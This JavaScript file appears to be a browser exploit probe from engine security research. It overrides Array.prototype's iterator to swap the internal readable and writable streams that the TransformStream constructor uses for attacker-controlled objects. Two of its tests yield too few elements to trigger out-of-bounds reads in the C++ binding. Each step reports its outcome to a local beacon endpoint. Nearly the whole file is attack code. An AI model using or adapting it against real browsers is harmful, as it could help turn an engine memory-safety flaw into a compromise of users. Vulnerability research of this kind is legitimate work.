/*
 * p436 -- TransformStream SequenceConverter substitution
 *
 * TransformStream constructor calls createInternalTransformStreamFromTransformer
 * which returns [internalTS, readableStream, writableStream].
 * C++ SequenceConverter converts this, ASSERT(size==3) compiled out.
 * Then jsDynamicCast<JSReadableStream*> and ->wrapped() extract C++ objects.
 *
 * If we override Symbol.iterator on the result array, we can substitute
 * the readable and writable with OUR streams. The TransformStream then
 * wraps attacker-controlled C++ stream objects.
 *
 * Tests:
 *   A: Verify TransformStream works normally
 *   B: Substitute readable with our RS, writable with our WS
 *   C: Substitute with a RS that has held controller -- enqueue through it
 *   D: Substitute with streams from different TransformStreams
 *   E: Create 2 TransformStreams sharing same RS
 *   F: Read through substituted TS, write through substituted TS
 *
 * Beacon prefix: V436-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V436-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// ================================================================
// Test A: Baseline TransformStream
// ================================================================
function testA() {
  B("A-START");
  try {
    var ts = new TransformStream({
      transform: function(chunk, controller) {
        controller.enqueue(chunk.toUpperCase());
      }
    });
    B("A-TS-OK", {hasReadable: !!ts.readable, hasWritable: !!ts.writable});

    var writer = ts.writable.getWriter();
    var reader = ts.readable.getReader();

    writer.write("hello");
    writer.close();

    reader.read().then(function(r) {
      B("A-READ", {done: r.done, val: String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: Substitute readable with our own ReadableStream
// The TransformStream's .readable property should return our stream
// ================================================================
function testB() {
  B("B-START");

  // Create attacker streams
  var attackCtrl = null;
  var attackRS = new ReadableStream({
    start: function(c) { attackCtrl = c; }
  });

  var attackWSWriter = null;
  var attackWS = new WritableStream({
    write: function(chunk) {
      B("B-WS-WRITE", String(chunk).slice(0, 40));
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 3 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null) {
        intercepted = true;
        B("B-INTERCEPT", {
          type0: typeof self[0],
          type1: self[1] instanceof ReadableStream ? "RS" : typeof self[1],
          type2: self[2] instanceof WritableStream ? "WS" : typeof self[2]
        });

        // Substitute readable and writable
        var items = [self[0], attackRS, attackWS];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var ts = new TransformStream({
      transform: function(chunk, controller) {
        controller.enqueue("transformed-" + chunk);
      }
    });
    Array.prototype[Symbol.iterator] = origIter;

    B("B-TS-OK", {
      hasReadable: !!ts.readable,
      hasWritable: !!ts.writable,
      readableIsAttack: ts.readable === attackRS,
      writableIsAttack: ts.writable === attackWS
    });

    // Try to read from the TS's readable (should be our attackRS)
    var reader = ts.readable.getReader();
    attackCtrl.enqueue("ATTACKER-DATA");
    attackCtrl.close();

    reader.read().then(function(r) {
      B("B-READ", {done: r.done, val: String(r.value).slice(0, 60)});
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 60));
    });

    // Try to write through the TS's writable (should be our attackWS)
    var writer = ts.writable.getWriter();
    writer.write("WRITE-THROUGH-TS").then(function() {
      B("B-WRITE-OK");
    }).catch(function(e) {
      B("B-WRITE-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("B-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: Swap readables between two TransformStreams
// TS-A gets TS-B's readable, TS-B gets TS-A's readable
// ================================================================
function testC() {
  B("C-START");

  // First create a normal TS to capture its streams
  var tsAReadable = null, tsAWritable = null;
  var tsBReadable = null, tsBWritable = null;

  // Create TS-A normally
  var tsAIntercept = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 3 && !tsAIntercept) {
      if (typeof self[0] === "object" && self[0] !== null && self[1] instanceof ReadableStream) {
        tsAIntercept = true;
        tsAReadable = self[1];
        tsAWritable = self[2];
      }
    }
    return origIter.call(self);
  };

  try {
    var tsA = new TransformStream({
      transform: function(chunk, ctrl) { ctrl.enqueue("A-" + chunk); }
    });
    Array.prototype[Symbol.iterator] = origIter;
    B("C-TSA-OK", {gotRS: tsAReadable instanceof ReadableStream});

    // Create TS-B, substitute with TS-A's readable
    var tsBIntercept = false;
    Array.prototype[Symbol.iterator] = function() {
      var self = this;
      if (Array.isArray(self) && self.length === 3 && !tsBIntercept) {
        if (typeof self[0] === "object" && self[0] !== null && self[1] instanceof ReadableStream) {
          tsBIntercept = true;
          tsBReadable = self[1];
          tsBWritable = self[2];
          // Give TS-B TS-A's readable
          var items = [self[0], tsAReadable, self[2]];
          var idx = 0;
          return {
            next: function() {
              if (idx < items.length) return {value: items[idx++], done: false};
              return {done: true};
            }
          };
        }
      }
      return origIter.call(self);
    };

    var tsB = new TransformStream({
      transform: function(chunk, ctrl) { ctrl.enqueue("B-" + chunk); }
    });
    Array.prototype[Symbol.iterator] = origIter;
    B("C-TSB-OK");

    // Now: tsB.readable should be tsA's original readable
    // Writing to tsA should produce data readable from tsB
    var writerA = tsA.writable.getWriter();
    var readerB = tsB.readable.getReader();

    writerA.write("cross-stream");
    writerA.close();

    readerB.read().then(function(r) {
      B("C-CROSS-READ!!!", {done: r.done, val: String(r.value).slice(0, 60)});
    }).catch(function(e) {
      B("C-CROSS-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("C-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: Substitute with empty/fewer elements (OOB test)
// yield only 2 elements -> results[2] OOB
// ================================================================
function testD() {
  B("D-START");

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 3 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && self[1] instanceof ReadableStream) {
        intercepted = true;
        // Only yield 2 of 3 elements
        var items = [self[0], self[1]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var ts = new TransformStream();
    Array.prototype[Symbol.iterator] = origIter;
    B("D-TS-OK!!!");
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("D-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: Substitute with 1 element only (double OOB)
// ================================================================
function testE() {
  B("E-START");

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 3 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && self[1] instanceof ReadableStream) {
        intercepted = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var ts = new TransformStream();
    Array.prototype[Symbol.iterator] = origIter;
    B("E-TS-OK!!!");
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("E-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test F: Verify the substituted readable IS our stream
// ================================================================
function testF() {
  B("F-START");

  var myRS = new ReadableStream({
    start: function(c) {
      c.enqueue("F-MY-DATA");
      c.close();
    }
  });

  var myWS = new WritableStream({
    write: function(chunk) {
      B("F-WS-GOT", String(chunk).slice(0, 40));
    },
    close: function() {
      B("F-WS-CLOSED");
    }
  });

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 3 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && self[1] instanceof ReadableStream) {
        intercepted = true;
        var items = [self[0], myRS, myWS];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var ts = new TransformStream();
    Array.prototype[Symbol.iterator] = origIter;

    B("F-TS-OK");

    // The TS's readable should be our myRS
    var reader = ts.readable.getReader();
    reader.read().then(function(r) {
      B("F-READ", {done: r.done, val: String(r.value).slice(0, 40)});
      return reader.read();
    }).then(function(r) {
      B("F-READ-DONE", {done: r.done});
    }).catch(function(e) {
      B("F-READ-ERR", e.message.slice(0, 60));
    });

    // Write to TS's writable (should go to our myWS)
    var writer = ts.writable.getWriter();
    writer.write("F-WRITE-DATA").then(function() {
      B("F-WRITE-OK");
      return writer.close();
    }).catch(function(e) {
      B("F-WRITE-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("F-ERR", e.message.slice(0, 80));
  }
}

testA();
setTimeout(function() { testB(); }, 300);
setTimeout(function() { testC(); }, 700);
setTimeout(function() { testD(); }, 1100);
setTimeout(function() { testE(); }, 1500);
setTimeout(function() { testF(); }, 1900);
setTimeout(function() { B("DONE"); }, 4000);
})();
